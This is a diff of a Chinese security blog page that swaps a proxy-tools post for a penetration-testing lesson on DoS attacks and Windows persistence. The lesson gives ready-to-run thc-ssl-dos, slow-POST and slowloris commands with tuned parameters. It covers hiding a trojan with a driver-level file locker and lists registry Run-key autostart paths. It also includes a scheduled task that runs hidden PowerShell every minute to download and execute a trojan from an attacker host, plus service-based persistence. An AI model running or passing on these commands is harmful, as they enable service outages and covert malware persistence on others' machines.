@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="打开新世界">
-<title>魔法上网</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="DOS拒绝服务攻击 ssl-dos 一般用于打击https网站，如果目标挂了CDN无效\n安装：执行sudo apt-get install thc-ssl-dos安装程序\n攻击：\n1 thc-ssl-dos [目标ip] 443 --accept 慢速攻击 安装程序：\n1 2 3 sudo apt-get install openssl sudo apt-get install libssl-dev sudo apt-get install slowhttptest slow http Post攻击（针对接受 POST 请求的接口） 攻击命令：\n1 slowhttptest -c 2000 -B -g -o body_states -i 110 -r 200 -s 8192 -t FAKEVERB -u http://[目标ip] -x 10 -p 3 参数解释：\n参数 英文全称/含义 具体作用 -c 2000 connections（并发连接数） 指定向目标服务器同时建立2000个并发HTTP连接，这是攻击的核心资源消耗项，连接数越多，对服务器的资源占用越严重。 -B Body attack（慢POST攻击） 明确攻击类型为Slow POST（慢POST攻击）（也叫Body byterange attack），这是慢HTTP攻击的一种，核心是故意缓慢发送POST请求体，长时间占用服务器连接。 -g generate statistics（生成统计日志） 启用日志记录功能，会生成CSV格式的原始数据文件和HTML格式的可视化报告，用于记录攻击过程中的连接状态、响应时间、服务器负载等数据。 -o body_states output prefix（输出文件前缀） 指定日志文件的前缀为body_states，结合-g参数，会生成body_states.csv（数据文件）和body_states.html（可视化报告）两个文件。 -i 110 interval（数据块发送间隔） 指定每次发送请求体数据块之间的时间间隔为110毫秒（ms）。间隔越长，服务器的连接被占用的时间越久，攻击效果越显著。 -r 200 rate（每秒新建连接数） 指定每秒向目标新建200个连接，直到达到-c 2000的并发连接上限（约10秒可达到2000个并发）。 -s 8192 content length size（内容长度） 在HTTP请求头的Content-Length字段中声明预期发送8192字节（8KB）的请求体，欺骗服务器保持连接等待接收完整数据。 -t FAKEVERB HTTP verb（HTTP方法） 指定HTTP请求使用伪造的非标准方法FAKEVERB（正常HTTP方法为GET/POST/PUT等）。此举可尝试绕过部分服务器的防护规则，也用于测试服务器对非标准方法的兼容性。 -u http://[目标ip] URL（目标地址） 指定攻击目标的URL，需将[目标ip]替换为实际的服务器IP或域名。 -x 10 block size（数据块长度） 指定每次向服务器发送的请求体数据块长度为10字节。即每次只发10字节，等待110毫秒后再发下一个10字节，故意拖延请求体的传输速度。 -p 3 probe timeout（探测超时时间） 在发起正式攻击前，工具会先发送一个探测请求检查目标是否可达，若3秒内无响应则判定目标不可达，停止攻击。 原理解析： 发送 POST 请求时，在请求头中声明Content-Length: 8192（要发 8KB 数据），然后以 10 字节 / 110ms 的极慢速度发送请求体，让服务器一直等待接收完整的请求体，从而长期占用连接资源。\n">
+<title>1.14 自启动和DOS攻击初步</title>
 
-<link rel='canonical' href='https://www.retr0.xyz/p/%E9%AD%94%E6%B3%95%E4%B8%8A%E7%BD%91/'>
+<link rel='canonical' href='https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/'>
 
-<link rel="stylesheet" href="/scss/style.min.cdfea7edd08f20a450e32e39a442d404d324012e6a68d984ad7ca649217d9edf.css"><meta property='og:title' content="魔法上网">
-<meta property='og:description' content="打开新世界">
-<meta property='og:url' content='https://www.retr0.xyz/p/%E9%AD%94%E6%B3%95%E4%B8%8A%E7%BD%91/'>
+<link rel="stylesheet" href="/scss/style.min.cdfea7edd08f20a450e32e39a442d404d324012e6a68d984ad7ca649217d9edf.css"><meta property='og:title' content="1.14 自启动和DOS攻击初步">
+<meta property='og:description' content="DOS拒绝服务攻击 ssl-dos 一般用于打击https网站，如果目标挂了CDN无效\n安装：执行sudo apt-get install thc-ssl-dos安装程序\n攻击：\n1 thc-ssl-dos [目标ip] 443 --accept 慢速攻击 安装程序：\n1 2 3 sudo apt-get install openssl sudo apt-get install libssl-dev sudo apt-get install slowhttptest slow http Post攻击（针对接受 POST 请求的接口） 攻击命令：\n1 slowhttptest -c 2000 -B -g -o body_states -i 110 -r 200 -s 8192 -t FAKEVERB -u http://[目标ip] -x 10 -p 3 参数解释：\n参数 英文全称/含义 具体作用 -c 2000 connections（并发连接数） 指定向目标服务器同时建立2000个并发HTTP连接，这是攻击的核心资源消耗项，连接数越多，对服务器的资源占用越严重。 -B Body attack（慢POST攻击） 明确攻击类型为Slow POST（慢POST攻击）（也叫Body byterange attack），这是慢HTTP攻击的一种，核心是故意缓慢发送POST请求体，长时间占用服务器连接。 -g generate statistics（生成统计日志） 启用日志记录功能，会生成CSV格式的原始数据文件和HTML格式的可视化报告，用于记录攻击过程中的连接状态、响应时间、服务器负载等数据。 -o body_states output prefix（输出文件前缀） 指定日志文件的前缀为body_states，结合-g参数，会生成body_states.csv（数据文件）和body_states.html（可视化报告）两个文件。 -i 110 interval（数据块发送间隔） 指定每次发送请求体数据块之间的时间间隔为110毫秒（ms）。间隔越长，服务器的连接被占用的时间越久，攻击效果越显著。 -r 200 rate（每秒新建连接数） 指定每秒向目标新建200个连接，直到达到-c 2000的并发连接上限（约10秒可达到2000个并发）。 -s 8192 content length size（内容长度） 在HTTP请求头的Content-Length字段中声明预期发送8192字节（8KB）的请求体，欺骗服务器保持连接等待接收完整数据。 -t FAKEVERB HTTP verb（HTTP方法） 指定HTTP请求使用伪造的非标准方法FAKEVERB（正常HTTP方法为GET/POST/PUT等）。此举可尝试绕过部分服务器的防护规则，也用于测试服务器对非标准方法的兼容性。 -u http://[目标ip] URL（目标地址） 指定攻击目标的URL，需将[目标ip]替换为实际的服务器IP或域名。 -x 10 block size（数据块长度） 指定每次向服务器发送的请求体数据块长度为10字节。即每次只发10字节，等待110毫秒后再发下一个10字节，故意拖延请求体的传输速度。 -p 3 probe timeout（探测超时时间） 在发起正式攻击前，工具会先发送一个探测请求检查目标是否可达，若3秒内无响应则判定目标不可达，停止攻击。 原理解析： 发送 POST 请求时，在请求头中声明Content-Length: 8192（要发 8KB 数据），然后以 10 字节 / 110ms 的极慢速度发送请求体，让服务器一直等待接收完整的请求体，从而长期占用连接资源。\n">
+<meta property='og:url' content='https://www.retr0.xyz/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/'>
 <meta property='og:site_name' content='Retr0的小窝'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-10-27T22:41:59&#43;08:00'/><meta property='article:modified_time' content='2025-10-27T22:41:59&#43;08:00'/>
-<meta name="twitter:title" content="魔法上网">
-<meta name="twitter:description" content="打开新世界">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-12-16T18:07:16&#43;08:00'/><meta property='article:modified_time' content='2025-12-16T18:07:16&#43;08:00'/>
+<meta name="twitter:title" content="1.14 自启动和DOS攻击初步">
+<meta name="twitter:description" content="DOS拒绝服务攻击 ssl-dos 一般用于打击https网站，如果目标挂了CDN无效\n安装：执行sudo apt-get install thc-ssl-dos安装程序\n攻击：\n1 thc-ssl-dos [目标ip] 443 --accept 慢速攻击 安装程序：\n1 2 3 sudo apt-get install openssl sudo apt-get install libssl-dev sudo apt-get install slowhttptest slow http Post攻击（针对接受 POST 请求的接口） 攻击命令：\n1 slowhttptest -c 2000 -B -g -o body_states -i 110 -r 200 -s 8192 -t FAKEVERB -u http://[目标ip] -x 10 -p 3 参数解释：\n参数 英文全称/含义 具体作用 -c 2000 connections（并发连接数） 指定向目标服务器同时建立2000个并发HTTP连接，这是攻击的核心资源消耗项，连接数越多，对服务器的资源占用越严重。 -B Body attack（慢POST攻击） 明确攻击类型为Slow POST（慢POST攻击）（也叫Body byterange attack），这是慢HTTP攻击的一种，核心是故意缓慢发送POST请求体，长时间占用服务器连接。 -g generate statistics（生成统计日志） 启用日志记录功能，会生成CSV格式的原始数据文件和HTML格式的可视化报告，用于记录攻击过程中的连接状态、响应时间、服务器负载等数据。 -o body_states output prefix（输出文件前缀） 指定日志文件的前缀为body_states，结合-g参数，会生成body_states.csv（数据文件）和body_states.html（可视化报告）两个文件。 -i 110 interval（数据块发送间隔） 指定每次发送请求体数据块之间的时间间隔为110毫秒（ms）。间隔越长，服务器的连接被占用的时间越久，攻击效果越显著。 -r 200 rate（每秒新建连接数） 指定每秒向目标新建200个连接，直到达到-c 2000的并发连接上限（约10秒可达到2000个并发）。 -s 8192 content length size（内容长度） 在HTTP请求头的Content-Length字段中声明预期发送8192字节（8KB）的请求体，欺骗服务器保持连接等待接收完整数据。 -t FAKEVERB HTTP verb（HTTP方法） 指定HTTP请求使用伪造的非标准方法FAKEVERB（正常HTTP方法为GET/POST/PUT等）。此举可尝试绕过部分服务器的防护规则，也用于测试服务器对非标准方法的兼容性。 -u http://[目标ip] URL（目标地址） 指定攻击目标的URL，需将[目标ip]替换为实际的服务器IP或域名。 -x 10 block size（数据块长度） 指定每次向服务器发送的请求体数据块长度为10字节。即每次只发10字节，等待110毫秒后再发下一个10字节，故意拖延请求体的传输速度。 -p 3 probe timeout（探测超时时间） 在发起正式攻击前，工具会先发送一个探测请求检查目标是否可达，若3秒内无响应则判定目标不可达，停止攻击。 原理解析： 发送 POST 请求时，在请求头中声明Content-Length: 8192（要发 8KB 数据），然后以 10 字节 / 110ms 的极慢速度发送请求体，让服务器一直等待接收完整的请求体，从而长期占用连接资源。\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
         <link rel="stylesheet" href="/css/APlayer.min.css">
@@ -319,11 +319,23 @@
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li>
+    <li><a href="#dos拒绝服务攻击">DOS拒绝服务攻击</a>
       <ol>
-        <li><a href="#代理工具">代理工具：</a></li>
-        <li><a href="#机场">机场：</a></li>
-        <li><a href="#起飞">起飞：</a></li>
+        <li><a href="#ssl-dos">ssl-dos</a></li>
+        <li><a href="#慢速攻击">慢速攻击</a>
+          <ol>
+            <li><a href="#slow-http-post攻击针对接受-post-请求的接口">slow http Post攻击（针对接受 POST 请求的接口）</a></li>
+            <li><a href="#slowloris攻击针对所有接受-get-请求的页面基本通用">slowloris攻击（针对所有接受 GET 请求的页面，基本通用）</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#其他内容">其他内容</a>
+      <ol>
+        <li><a href="#驱动级文件保护软件">驱动级文件保护软件</a></li>
+        <li><a href="#注册表自启动">注册表自启动</a></li>
+        <li><a href="#计划任务启动">计划任务启动</a></li>
+        <li><a href="#服务启动">服务启动</a></li>
       </ol>
     </li>
   </ol>
@@ -344,8 +356,12 @@
     
     <header class="article-category">
         
-            <a href="/categories/%E6%9D%82%E9%A1%B9/" >
-                杂项
+            <a href="/categories/%E7%BD%91%E5%AE%89/" style="background-color: #BEBDBD; color: #fff;">
+                网安
+            </a>
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%BE%AE%E4%B8%93%E4%B8%9A/" >
+                渗透测试微专业
             </a>
         
     </header>
@@ -353,13 +369,9 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/%E9%AD%94%E6%B3%95%E4%B8%8A%E7%BD%91/">魔法上网</a>
+            <a href="/p/1.14-%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8Cdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%AD%A5/">1.14 自启动和DOS攻击初步</a>
         </h2>
     
-        
-        <h3 class="article-subtitle">
-            打开新世界
-        </h3>
         
     </div>
 
@@ -379,7 +391,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2025-10-27</time>
+                <time class="article-time--published">2025-12-16</time>
             </div>
         
 
@@ -402,49 +414,175 @@
     <section class="article-content">
     
     
-    <h3 id="代理工具">代理工具：
-</h3><p>很久以前：</p>
-<p><strong>ShadowsocksR</strong> <strong>谁家文物</strong></p>
-<p><a class="link" href="https://github.com/ShadowsocksR-Live/ssrWin/releases"  target="_blank" rel="noopener"
-    >Releases · ShadowsocksR-Live/ssrWin</a></p>
-<p>现在主流：</p>
-<p><strong>v2rayN 支持vmess格式</strong></p>
-<p><a class="link" href="https://github.com/2dust/v2rayN?search=1"  target="_blank" rel="noopener"
-    >v2rayN/ at master · 2dust/v2rayN</a></p>
-<p><strong>clash 最全能</strong></p>
-<p><a class="link" href="https://github.com/clash-version/clash-download"  target="_blank" rel="noopener"
-    >GitHub - clash-version/clash-download: Clash 下载|持续收藏CLash版本|2025年8月更新</a></p>
-<p>目前自用</p>
-<p><a class="link" href="https://github.com/chen08209/FlClash"  target="_blank" rel="noopener"
-    >GitHub - chen08209/FlClash: A multi-platform proxy client based on ClashMeta,simple and easy to use, open-source and ad-free.</a></p>
-<p>备用方案：</p>
-<p>去tg上找破解vpn</p>
-<h3 id="机场">机场：
-</h3><p>GitHub推荐列表</p>
-<p><a class="link" href="https://github.com/yonghumeijj/jichang"  target="_blank" rel="noopener"
-    >GitHub - yonghumeijj/jichang: 2025年最新性价比机场推荐VPN、翻墙🚀推荐稳定性高，适合各类人需求的机场</a></p>
-<p>目前自用</p>
-<p><a class="link" href="https://yiyuan.co"  target="_blank" rel="noopener"
-    >一元机场</a>（一月一块，包年12）</p>
-<p>备选方案：</p>
-<p>海外VPS自己部署 （不推荐）</p>
-<h3 id="起飞">起飞：
-</h3><ul>
-<li>选择合适的套餐订阅后在帮助文档中使用一键导入按钮导入节点</li>
-<li>测试真延迟并选择延迟最低节点</li>
-<li>芜湖起飞</li>
-</ul>
-<blockquote>
-<p>孩子们，P站并不好看。</p>
-</blockquote>
-<p><img src="/post/%e6%9d%82%e9%a1%b9/%e7%89%a2%e5%a4%a7.webp"
-	
-	
-	
-	loading="lazy"
-	
-	
-></p>
+    <h2 id="dos拒绝服务攻击">DOS拒绝服务攻击
+</h2><h3 id="ssl-dos">ssl-dos
+</h3><p>一般用于打击https网站，如果目标挂了CDN无效</p>
+<p>安装：执行<code>sudo apt-get install thc-ssl-dos</code>安装程序</p>
+<p>攻击：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">thc-ssl-dos <span class="o">[</span>目标ip<span class="o">]</span> <span class="m">443</span> --accept
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="慢速攻击">慢速攻击
+</h3><p><strong>安装程序：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt-get install openssl
+</span></span><span class="line"><span class="cl">sudo apt-get install libssl-dev
+</span></span><span class="line"><span class="cl">sudo apt-get install slowhttptest
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="slow-http-post攻击针对接受-post-请求的接口">slow http Post攻击（针对接受 POST 请求的接口）
+</h4><p><strong>攻击命令：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">slowhttptest -c <span class="m">2000</span> -B -g -o body_states -i <span class="m">110</span> -r <span class="m">200</span> -s <span class="m">8192</span> -t FAKEVERB -u http://<span class="o">[</span>目标ip<span class="o">]</span> -x <span class="m">10</span> -p <span class="m">3</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>参数解释：</strong></p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>参数</th>
+          <th>英文全称/含义</th>
+          <th>具体作用</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>-c 2000</code></td>
+          <td><code>connections</code>（并发连接数）</td>
+          <td>指定向目标服务器同时建立<strong>2000个并发HTTP连接</strong>，这是攻击的核心资源消耗项，连接数越多，对服务器的资源占用越严重。</td>
+      </tr>
+      <tr>
+          <td><code>-B</code></td>
+          <td><code>Body attack</code>（慢POST攻击）</td>
+          <td>明确攻击类型为<strong>Slow POST（慢POST攻击）</strong>（也叫Body byterange attack），这是慢HTTP攻击的一种，核心是故意缓慢发送POST请求体，长时间占用服务器连接。</td>
+      </tr>
+      <tr>
+          <td><code>-g</code></td>
+          <td><code>generate statistics</code>（生成统计日志）</td>
+          <td>启用日志记录功能，会生成<strong>CSV格式的原始数据文件</strong>和<strong>HTML格式的可视化报告</strong>，用于记录攻击过程中的连接状态、响应时间、服务器负载等数据。</td>
+      </tr>
+      <tr>
+          <td><code>-o body_states</code></td>
+          <td><code>output prefix</code>（输出文件前缀）</td>
+          <td>指定日志文件的前缀为<code>body_states</code>，结合<code>-g</code>参数，会生成<code>body_states.csv</code>（数据文件）和<code>body_states.html</code>（可视化报告）两个文件。</td>
+      </tr>
+      <tr>
+          <td><code>-i 110</code></td>
+          <td><code>interval</code>（数据块发送间隔）</td>
+          <td>指定每次发送请求体数据块之间的<strong>时间间隔为110毫秒（ms）</strong>。间隔越长，服务器的连接被占用的时间越久，攻击效果越显著。</td>
+      </tr>
+      <tr>
+          <td><code>-r 200</code></td>
+          <td><code>rate</code>（每秒新建连接数）</td>
+          <td>指定<strong>每秒向目标新建200个连接</strong>，直到达到<code>-c 2000</code>的并发连接上限（约10秒可达到2000个并发）。</td>
+      </tr>
+      <tr>
+          <td><code>-s 8192</code></td>
+          <td><code>content length size</code>（内容长度）</td>
+          <td>在HTTP请求头的<code>Content-Length</code>字段中声明<strong>预期发送8192字节（8KB）的请求体</strong>，欺骗服务器保持连接等待接收完整数据。</td>
+      </tr>
+      <tr>
+          <td><code>-t FAKEVERB</code></td>
+          <td><code>HTTP verb</code>（HTTP方法）</td>
+          <td>指定HTTP请求使用<strong>伪造的非标准方法</strong><code>FAKEVERB</code>（正常HTTP方法为GET/POST/PUT等）。此举可尝试绕过部分服务器的防护规则，也用于测试服务器对非标准方法的兼容性。</td>
+      </tr>
+      <tr>
+          <td><code>-u http://[目标ip]</code></td>
+          <td><code>URL</code>（目标地址）</td>
+          <td>指定<strong>攻击目标的URL</strong>，需将<code>[目标ip]</code>替换为实际的服务器IP或域名。</td>
+      </tr>
+      <tr>
+          <td><code>-x 10</code></td>
+          <td><code>block size</code>（数据块长度）</td>
+          <td>指定每次向服务器发送的<strong>请求体数据块长度为10字节</strong>。即每次只发10字节，等待110毫秒后再发下一个10字节，故意拖延请求体的传输速度。</td>
+      </tr>
+      <tr>
+          <td><code>-p 3</code></td>
+          <td><code>probe timeout</code>（探测超时时间）</td>
+          <td>在发起正式攻击前，工具会先发送一个<strong>探测请求</strong>检查目标是否可达，若3秒内无响应则判定目标不可达，停止攻击。</td>
+      </tr>
+  </tbody>
+</table></div>
+<p><strong>原理解析：</strong> 发送 POST 请求时，在请求头中声明<code>Content-Length: 8192</code>（要发 8KB 数据），然后以 <strong>10 字节 / 110ms</strong> 的极慢速度发送请求体，让服务器一直等待接收完整的请求体，从而长期占用连接资源。</p>
+<h4 id="slowloris攻击针对所有接受-get-请求的页面基本通用">slowloris攻击（针对所有接受 GET 请求的页面，基本通用）
+</h4><p><strong>攻击命令：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">slowhttptest -c <span class="m">2000</span> -H -g -o my_header_states -i <span class="m">10</span> -r <span class="m">1000</span> -s <span class="m">8192</span> -t GET -u http://<span class="o">[</span>目标ip<span class="o">]</span> -x <span class="m">24</span> -p <span class="m">3</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>原理解析：</strong> 发送 GET 请求时，故意 <strong>逐个缓慢发送 HTTP 请求头字段</strong> （如<code>Host:</code>、<code>User-Agent:</code>、<code>Accept:</code>等），每个字段大小为 24 字节，发送间隔仅 10ms（看似快，但对服务器的连接处理机制而言，仍足够慢以占用连接），且不发送请求头的结束标记（<code>\r\n\r\n</code>），让服务器认为请求头还在传输中，从而一直保持连接等待完整的请求头。</p>
+<h2 id="其他内容">其他内容
+</h2><h3 id="驱动级文件保护软件">驱动级文件保护软件
+</h3><p>使用 **Easy File Locker ** 可以对我们的文件进行驱动级的保护和隐藏，当然包括我们放在目标上的木马程序。</p>
+<p>当配置完毕（或我们自己中招）后，我们可以检查下面两个文件夹看看是否真的生效了</p>
+<p><code>C:/Windows/xlfks.xxx</code>(包括但不限于dat、dll、ini、log&hellip;&hellip;)</p>
+<p><code>C:/Windows/system32/drivers/xlkfs.sys</code></p>
+<p>如果检查出上面两个文件就说明是驱动级的文件隐藏</p>
+<hr>
+<p><strong>如何清除：</strong></p>
+<ol>
+<li>查询服务状态<code>sc qc xlkfs</code></li>
+<li>停止服务<code>net stop xlkfs</code></li>
+<li>删除服务<code>sc delete xlkfs</code></li>
+<li>找到上面的两位个文件残余并删除</li>
+<li>删除木马程序</li>
+</ol>
+<h3 id="注册表自启动">注册表自启动
+</h3><p><code>Win+R</code>输入regedit回车打开注册表</p>
+<p><strong>路径一：</strong></p>
+<p>找到路径为<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></p>
+<p><strong>路径二：</strong></p>
+<p>找到路径为<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code></p>
+<p><strong>路径三：</strong></p>
+<p>找到路径为<code>HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon</code></p>
+<p><strong>路径四：</strong></p>
+<p>找到路径为<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></p>
+<p><strong>路径五：</strong></p>
+<p>找到路径为<code>HKEY_CURRENT_USER\Environment</code></p>
+<p>**说明：**路径三、四、五内的条目都是Windows在登录时会执行的任务</p>
+<p>右键新建字符串值，在数据中输入要自启动的文件路径和启动参数</p>
+<h3 id="计划任务启动">计划任务启动
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="nb">sc </span><span class="n">minute</span> <span class="p">/</span><span class="n">mo</span> <span class="mf">1</span> <span class="p">/</span><span class="n">tn</span> <span class="s2">&#34;示例名称&#34;</span> <span class="p">/</span><span class="n">tr</span> <span class="s2">&#34;powershell.exe -nop -w hidden
+</span></span></span><span class="line"><span class="cl"><span class="s2">-c \&#34;</span><span class="n">IEX</span><span class="p">((</span><span class="nb">new-object</span> <span class="n">net</span><span class="p">.</span><span class="n">webclient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(\</span><span class="s2">&#34;\&#34;</span><span class="p">\</span><span class="s2">&#34;http://[攻击机ip]/
+</span></span></span><span class="line"><span class="cl"><span class="s2">[木马文件]&#34;</span><span class="p">\</span><span class="s2">&#34;\&#34;</span><span class="p">\</span><span class="s2">&#34;))\&#34;&#34;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>上面的代码会让目标每分钟在后台下载并执行攻击者的木马程序</p>
+<h3 id="服务启动">服务启动
+</h3><p>增加一个服务</p>
+<p><code>sc create &quot;示例名称&quot; binpath= &quot;cmd /c start 具体命令&quot;</code></p>
+<p>设置服务描述</p>
+<p><code>sc description 示例名称 &quot;示例描述&quot;</code></p>
+<p>设置自动启动</p>
+<p><code>sc config 示例名称 start= auto</code></p>
+<p>开启服务</p>
+<p><code>net start 示例名称</code></p>
 
 </section>
 
@@ -507,50 +645,12 @@
             
                 
 <article class="">
-    <a href="/p/%E8%A3%85%E6%9C%BA%E6%B3%9540%E6%9D%A1-laws-for-computer-assembly/">
+    <a href="/p/1.13-%E6%9B%B4%E5%A4%9A%E6%9C%A8%E9%A9%AC%E7%A8%8B%E5%BA%8F/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">装机法40条 (Laws for Computer Assembly)</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/%E5%85%8D%E8%B4%B9%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%E5%9F%BA%E4%BA%8E%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/%E4%BA%91%E7%94%B5%E8%84%91%E7%9A%84%E5%85%A8%E8%87%AA%E5%8A%A8%E5%88%B7%E8%AF%BE%E5%B9%B3%E5%8F%B0/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="https://img1.dancihu.com/2023-10-31/a116a2e0-4624-8c67-900f-7e6165b9012f.jpg" loading="lazy" data-key="" data-hash="https://img1.dancihu.com/2023-10-31/a116a2e0-4624-8c67-900f-7e6165b9012f.jpg"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">[免费]保姆级教程：基于云服务器/云电脑的全自动刷课平台</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/%E5%9B%9E%E5%BF%86%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92wannacry%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="https://s.secrss.com/anquanneican/eba6dc46083f85d24ac9474fa735590a.jpg" loading="lazy" data-key="" data-hash="https://s.secrss.com/anquanneican/eba6dc46083f85d24ac9474fa735590a.jpg"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">回忆勒索病毒WannaCry：深度剖析</h2>
+            <h2 class="article-title">1.13  更多木马程序</h2>
         </div>
     </a>
 </article>
@@ -558,12 +658,51 @@
             
                 
 <article class="">
-    <a href="/p/%E8%B0%B7%E6%AD%8C%E6%90%9C%E7%B4%A2%E8%AF%AD%E6%B3%95/">
+    <a href="/p/1.12-%E8%BF%9B%E9%98%B6%E5%90%8E%E9%97%A8%E6%93%8D%E4%BD%9C/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">谷歌搜索语法</h2>
+            <h2 class="article-title">1.12 进阶后门操作</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.11-linux%E6%8F%90%E6%9D%83%E7%BB%AD%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.11 Linux提权(续)和钓鱼网站</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.10-linux%E6%8F%90%E6%9D%83%E5%92%8C%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.10 Linux提权和密码破解</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/1.9-msf%E6%A4%8D%E5%85%A5%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">1.9 msf植入永久后门</h2>
         </div>
     </a>
 </article>
